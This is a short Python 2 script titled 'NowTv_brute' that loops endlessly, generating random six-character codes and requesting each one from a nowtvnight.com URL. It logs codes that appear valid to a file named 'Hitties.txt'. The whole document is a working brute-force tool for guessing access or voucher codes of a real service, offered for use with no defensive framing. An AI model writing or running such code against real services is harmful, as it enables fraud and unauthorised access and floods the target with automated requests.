# -*- coding: cp1252 -*-
import requests
from pyquery import PyQuery
import random


def get_html():
    html = connection.text[:100]
    pq = PyQuery(html)
    tag = pq(connection.content)
    lol = (tag('label').text())
    print lol
    if lol == '':
        with open("Hitties.txt","a") as myfile:
            myfile.write(''.join(characters))
            myfile.write('\n')
            

letters = ['a','b','c','d','e','f','g','h','i','l','m','n','o','p','q','r','s','t','u','v','w','y','k','z','1','2','3','4','5','6','7','8','9','0']
characters = ['0','0','0','0','0','0']

print("Welcome to NowTv_brute.")
active = True
while active:
    for i in range(1,7):
        characters[(i - 1)] = random.choice(letters)
    print("trying with code "+''.join(characters))
    connection = requests.get('http://www.nowtvnight.com/'+str(''.join(characters)))
    get_html()
    
